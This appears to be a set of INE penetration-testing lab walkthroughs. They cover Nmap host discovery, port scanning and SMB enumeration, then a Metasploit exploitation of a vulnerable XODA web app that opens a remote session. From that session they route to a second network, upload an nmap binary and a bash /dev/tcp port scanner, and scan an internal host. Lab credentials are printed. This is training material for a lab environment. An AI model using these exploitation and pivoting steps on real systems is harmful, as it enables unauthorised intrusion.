# Host Discovery Lab using Nmap

This lab demonstrates techniques to discover hosts behind a firewall using Nmap on a Kali Linux machine.

## Contents
- Basic ping test
- Nmap host discovery with `-Pn`
- Port scan and service version detection
- Understanding filtered ports

## Lab Commands Used
```bash
ping -c 5 demo.ine.local
nmap demo.ine.local
nmap -Pn demo.ine.local
nmap -Pn -p 443 demo.ine.local
nmap -Pn -sV -p 80 demo.ine.local
```
## Reference
  [Nmap Official Docs](https://nmap.org/)
# Host Discovery Lab using Nmap

This lab demonstrates how to perform host discovery on a network using **Nmap**. It focuses on identifying live hosts behind a firewall that may not respond to traditional ICMP ping requests.

##  Lab Steps Overview

1. **Ping the Target Host**
   ```bash
   ping -c 5 demo.ine.local
   ```
2. **Run Basic Nmap Scan**

```bash
  nmap demo.ine.local
```
3. **Use `-Pn` Option to Skip Host Discovery**

```bash
nmap -Pn demo.ine.local
```
4. **Scan Specific Port (e.g., 443)**

```bash
nmap -Pn -p 443 demo.ine.local
```
5. **Detect Application Version on Port 80**

```bash
nmap -Pn -sV -p 80 demo.ine.local
```
##  References

- [Nmap Official Documentation](https://nmap.org/)
- [Nmap Port Scanning Basics](https://nmap.org/book/man-port-scanning-basics.html)

#  Scan the Server 1

This lab walks through the process of using **Nmap** to scan a target machine for open ports and perform service detection.

---

## Step 1: Access the Kali Machine

- Open the lab link provided by the instructor or lab environment.
- This will give you access to a Kali Linux instance where you can execute all required commands.

---

## 📡 Step 2: Check if the Target Machine is Reachable

Use the `ping` command to ensure the target machine is online and reachable:

```bash
ping -c 4 demo.ine.local
```

- The `-c 4` flag sends 4 ICMP packets.
- If the target responds, it's reachable and ready for scanning.

**Result:** The target machine is reachable.

---

##  Step 3: Port Scanning with Nmap

###  Basic Nmap Scan

Run the default Nmap scan to identify commonly open ports:

```bash
nmap demo.ine.local
```

 **Note:**  
The default Nmap scan only checks the top 1000 most commonly used ports.  
In this case, **no open ports were found** using the default scan.

---

###  Full TCP Port Scan

To scan all **65,535 TCP ports**, use the `-p-` flag:

```bash
nmap demo.ine.local -p-
```

 **Result:** The scan reveals that **3 ports** are open on the target system.

---

##  Step 4: Service Detection with Nmap

Once the open ports are identified (e.g., 6421, 41288, 55413), use Nmap to perform **service and version detection**:

```bash
nmap demo.ine.local -p 6421,41288,55413 -sV
```

- The `-sV` flag tells Nmap to detect service versions running on the open ports.

 **Result:** The scan identifies the names and versions of the services running on the open ports.

---

##  Conclusion

In this lab, we successfully:

- Verified the availability of the target machine.
- Used Nmap to perform a **default** and **full TCP port scan**.
- Identified **3 open ports**.
- Used **service detection** to find out which services and versions were running on the open ports.

---

##  Tools Used

- **Kali Linux**
- **Nmap**

---

##  References

- [Nmap Official Documentation](https://nmap.org/book/man.html)
- [Kali Linux Tools](https://tools.kali.org/)

---

##  Author

> This document was generated as part of a penetration testing practice lab on the **INE platform**.
#  Lab: Windows Recon - SMB Nmap Scripts

This lab demonstrates how to use **Nmap SMB scripts** to perform reconnaissance on a Windows machine exposing SMB services.

---

##  Step 1: Access the Kali Machine

- Open the provided lab link to access the Kali Linux environment.

---

##  Step 2: Ping the Target Machine

Check if the target machine is alive:

```bash
ping -c 5 demo.ine.local
```

**Result:** All five packets were successfully sent and received, confirming the machine is up.

---

##  Step 3: Initial Nmap Scan

Run a basic Nmap scan to identify open ports:

```bash
nmap demo.ine.local
```

---

##  Step 4: Identify SMB Protocols

Check which SMB protocols are supported on port 445:

```bash
nmap -p445 --script smb-protocols demo.ine.local
```

---

##  Step 5: Check SMB Security Mode

Run the script to get SMB security mode details:

```bash
nmap -p445 --script smb-security-mode demo.ine.local
```

**Result:** Able to retrieve security level of SMB using a guest account.

🔗 [More Info](https://nmap.org/nsedoc/scripts/smb-security-mode.html)

---

##  Step 6: Enumerate Logged-in Users

### Without Credentials

```bash
nmap -p445 --script smb-enum-sessions demo.ine.local
```

> Found: user "bob" is logged in (guest login enabled - a misconfiguration)

### With Valid Credentials

```bash
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

##  Step 7: Enumerate SMB Shares

### Without Credentials

```bash
nmap -p445 --script smb-enum-shares demo.ine.local
```

**Result:** IPC$ share has read/write access via guest account.

📘 About IPC$: Null session share allowing enumeration.

🔗 [Read More](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)

### With Credentials

```bash
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** Administrator has full access to C$ (C:\ drive)

---

##  Step 8: Enumerate Users on the Target

```bash
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Users Discovered:** Administrator, bob, Guest

---

##  Step 9: Get Server Statistics

```bash
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** Server stats including failed logins, open files, and system errors.

 Note: Your output may vary depending on system activity.

---

##  Step 10: Enumerate Domains

```bash
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

 **Result:** Built-in domain identified.

---

##  Step 11: Enumerate User Groups

```bash
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

##  Step 12: Enumerate Services

```bash
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

---

## Step 13: List Files in Shared Folders

```bash
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

**Result:** All shared folders and their contents were listed.

---

##  Conclusion

In this lab, we used multiple Nmap SMB scripts to:

- Discover SMB versions and security modes
- Enumerate sessions, shares, users, groups, and services
- Check permissions with and without credentials

---

##  Tools Used

- Kali Linux
- Nmap with SMB NSE scripts

---

##  References

- [Nmap Official Site](https://nmap.org/)
- [Nmap SMB Scripts Documentation](https://nmap.org/nsedoc/scripts)
- [Microsoft IPC$ Documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)
- [INE Lab Page](https://my.ine.com/CyberSecurity/courses/a415dc11-1c2a-43d5-86ae-1f919d5661cd/assessment-methodologies-footprinting-scanning/lab/5ace3b40-27a1-4322-8891-694e801f4b4d)

# Lab: Importing Nmap Scan Results Into Metasploit & Service Scanning

## Overview

This lab demonstrates the process of:
1. Importing Nmap scan results into the Metasploit Framework (MSF)
2. Performing a port scan using different methods
3. Exploiting a vulnerable XODA web app instance
4. Routing and scanning a second target machine

---

## Part 1: Importing Nmap Scan Results Into MSF

### Step 1: Access Kali Machine
Open the lab link to access the Kali Linux environment.

### Step 2: Ping Target Machine
```bash
ping -c 4 demo.ine.local
```
If not reachable, use the `-Pn` option in Nmap to skip host discovery.

### Step 3: Perform Nmap Scan and Save Output
```bash
nmap -sV -Pn -oX myscan.xml demo.ine.local
```

### Step 4: Start PostgreSQL Service
```bash
service postgresql start
```

### Step 5: Start Metasploit Framework
```bash
msfconsole
```

### Step 6: Check Database Status
```bash
db_status
```

### Step 7: Import Scan Results into MSF
```bash
db_import myscan.xml
```

### Step 8: View Imported Results
```bash
hosts
services
```

---

## Part 2: T1046 - Network Service Scanning

### Step 1: Access Kali Machine

### Step 2: Ping New Target
```bash
ping -c 4 demo1.ine.local
```

### Step 3: Default Nmap Scan
```bash
nmap demo1.ine.local
```

### Step 4: View HTTP Content
```bash
curl demo1.ine.local
```

### Step 5: Start Metasploit
```bash
msfconsole
```

### Step 6: Exploit XODA File Upload
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

### Step 7: Check Network Interfaces
```bash
shell
ip addr
```

### Step 8: Add Route to MSF
```bash
run autoroute -s 192.180.108.2
```

### Step 9: Port Scan Second Target
```bash
CTRL+Z
y
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

---

## Part 3: Bash & Static Binary Scanning

### Step 10: Check Nmap Binary
```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

### Step 11: Create Bash Port Scanner Script
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```
Save as: `bash-port-scanner.sh`

### Step 12: Return to Meterpreter
```bash
fg
sessions -i 1
```

### Step 13: Upload Files
```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

### Step 14: Make Executable and Run Scanner
```bash
shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

### Step 15: Use Nmap Binary to Scan
```bash
./nmap -p- 192.180.108.3
```

---

## References

- MITRE ATT&CK: [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
- Bash TCP Port Scanner: [https://catonmat.net/tcp-port-scanner-in-bash](https://catonmat.net/tcp-port-scanner-in-bash)

